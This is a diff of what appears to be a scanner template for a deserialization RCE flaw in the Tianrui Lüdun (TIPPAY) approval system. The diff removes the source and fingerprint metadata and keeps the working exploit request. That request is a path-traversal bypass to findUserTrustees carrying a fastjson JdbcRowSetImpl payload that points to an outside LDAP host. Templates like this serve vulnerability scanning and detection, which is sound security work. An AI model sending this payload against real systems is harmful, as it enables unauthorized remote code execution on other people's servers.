@@ -3,12 +3,8 @@ info:
   name: 天锐绿盾审批系统findUserTrustees存在反序列化漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ntgi1waggmahgvog'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ntgi1waggmahgvog
-    fofa: app="TIPPAY-绿盾审批系统"
 http:
 - raw:
   - "POST /trwfe/login.jsp/..;/rest/ext/findUserTrustees  HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,\nlike Gecko) Chrome/91.0.4472.77 Safari/537.36\nContent-Type: application/json\n\n{\n    \"userId\": \"admin\",\n    \"userName\": {\n\"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n\"dataSourceName\": \"ldap://dnslog.cn\",\n\"autoCommit\": true\n    },\n    \"Msgeffect\": \"true\"\n}"
